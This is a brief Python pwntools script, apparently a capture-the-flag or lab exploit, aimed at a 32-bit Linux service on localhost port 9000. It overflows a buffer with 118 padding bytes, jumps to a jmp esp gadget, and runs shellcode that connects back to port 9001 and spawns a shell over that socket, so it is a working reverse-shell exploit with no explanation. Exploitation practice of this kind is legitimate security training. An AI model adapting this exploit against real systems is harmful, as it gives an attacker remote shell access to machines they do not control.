from pwn import *

context(arch="i386", os="linux", log_level="info")
H,P = "localhost",9000
jmp_esp = 0x080488b0
s = remote(H, P)


b = s.recvuntil(" ")
print b
payload = "echo "
payload += "A"*118
payload += p32(jmp_esp)
payload += asm(shellcraft.i386.linux.connect("localhost",9001))
payload += asm(shellcraft.i386.linux.dup2('edx',1))
payload += asm(shellcraft.i386.linux.dup2('edx',2))
payload += asm(shellcraft.i386.linux.dup2('edx',0))
payload += asm(shellcraft.i386.linux.execve())
s.sendline(payload)
